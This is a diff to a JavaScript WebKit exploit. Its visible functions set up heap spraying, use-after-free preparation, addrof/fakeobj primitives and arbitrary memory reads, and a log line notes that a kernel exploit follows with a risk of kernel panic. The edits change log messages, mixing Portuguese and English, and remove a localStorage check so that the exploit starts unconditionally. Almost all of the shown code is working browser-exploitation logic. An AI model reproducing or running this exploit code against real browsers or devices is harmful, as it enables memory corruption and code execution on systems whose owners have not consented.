@@ -116,13 +116,14 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Webkit concluído. Excecutando a exploração do kernel (RISCO DE KP)");
+	debug_log("[+] Succesfully got addrof/fakeobj");
+	debug_log("");
+	debug_log("..................................................ATENÇÃO!!! AGUARDE UNS 20 SEGUNDOS");
 
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
-
 }
 
 function read(addr, length) {
@@ -192,7 +193,7 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("[+] Looking for the smashed StringImpl");
+	debug_log("[+] Looking for the smashed StringImpl...");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
@@ -414,7 +415,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("[+] Spraying HTMLTextareaElement");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
@@ -443,15 +444,13 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-		if(localStorage.isCached){
-		/* Init spray */
-		sprayHTMLTextArea();
+	/* Init spray */
+	sprayHTMLTextArea();
 
-		if(window.midExploit)
-			window.midExploit();
+	if(window.midExploit)
+		window.midExploit();
 
-		g_input = input1;
-		/* Shape heap layout for obj. reuse */
-		prepareUAF();
-	}
+	g_input = input1;
+	/* Shape heap layout for obj. reuse */
+	prepareUAF();
 }
